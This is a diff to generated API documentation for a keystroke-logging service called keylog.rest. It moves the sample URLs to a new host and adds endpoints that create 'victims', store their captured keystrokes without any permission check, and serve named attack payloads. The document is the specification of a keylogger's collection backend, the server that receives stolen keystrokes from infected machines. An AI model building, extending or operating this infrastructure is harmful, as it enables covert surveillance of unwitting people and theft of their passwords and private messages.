@@ -11,15 +11,61 @@
     "groupTitle": "Info",
     "sampleRequest": [
       {
-        "url": "https://david-kroell.github.io/keylog.rest/"
+        "url": "https://log.its-nw.tk/"
       }
     ]
   },
   {
     "type": "post",
-    "url": "/api/victim",
+    "url": "/api/victims/:id/logs",
+    "title": "Create logs for specific victim",
+    "name": "CreateLog",
+    "group": "Log",
+    "permission": [
+      {
+        "name": "None"
+      }
+    ],
+    "parameter": {
+      "fields": {
+        "Parameter": [
+          {
+            "group": "Parameter",
+            "type": "String",
+            "optional": false,
+            "field": "keystrokes",
+            "description": "<p>Keystrokes to add in database</p>"
+          }
+        ]
+      }
+    },
+    "success": {
+      "fields": {
+        "Success 200": [
+          {
+            "group": "Success 200",
+            "type": "Object",
+            "optional": false,
+            "field": "message",
+            "description": ""
+          }
+        ]
+      }
+    },
+    "version": "0.0.0",
+    "filename": "routes/api.js",
+    "groupTitle": "Log",
+    "sampleRequest": [
+      {
+        "url": "https://log.its-nw.tk/api/victims/:id/logs"
+      }
+    ]
+  },
+  {
+    "type": "post",
+    "url": "/api/victims",
     "title": "Create the victim to log",
-    "name": "AddKeystrokes",
+    "name": "CreateVictim",
     "group": "Log",
     "permission": [
       {
@@ -71,7 +117,7 @@
     "groupTitle": "Log",
     "sampleRequest": [
       {
-        "url": "https://david-kroell.github.io/keylog.rest/api/victim"
+        "url": "https://log.its-nw.tk/api/victims"
       }
     ]
   },
@@ -99,13 +145,13 @@
     "groupTitle": "Payloads",
     "sampleRequest": [
       {
-        "url": "https://david-kroell.github.io/keylog.rest/payloads/"
+        "url": "https://log.its-nw.tk/payloads/"
       }
     ]
   },
   {
     "type": "get",
-    "url": "/payloads/{PayloadName}",
+    "url": "/payloads/:payloadName",
     "title": "Get content of specific payload",
     "name": "GetPayloads",
     "group": "Payloads",
@@ -127,7 +173,7 @@
     "groupTitle": "Payloads",
     "sampleRequest": [
       {
-        "url": "https://david-kroell.github.io/keylog.rest/payloads/{PayloadName}"
+        "url": "https://log.its-nw.tk/payloads/:payloadName"
       }
     ]
   },
@@ -160,7 +206,7 @@
     "groupTitle": "Victims",
     "sampleRequest": [
       {
-        "url": "https://david-kroell.github.io/keylog.rest/api/victims"
+        "url": "https://log.its-nw.tk/api/victims"
       }
     ],
     "parameter": {
@@ -251,7 +297,7 @@
     "groupTitle": "Victims",
     "sampleRequest": [
       {
-        "url": "https://david-kroell.github.io/keylog.rest/api/victims/:id"
+        "url": "https://log.its-nw.tk/api/victims/:id"
       }
     ],
     "header": {
@@ -329,7 +375,7 @@
     "groupTitle": "Victims",
     "sampleRequest": [
       {
-        "url": "https://david-kroell.github.io/keylog.rest/api/victims/:id"
+        "url": "https://log.its-nw.tk/api/victims/:id"
       }
     ],
     "header": {
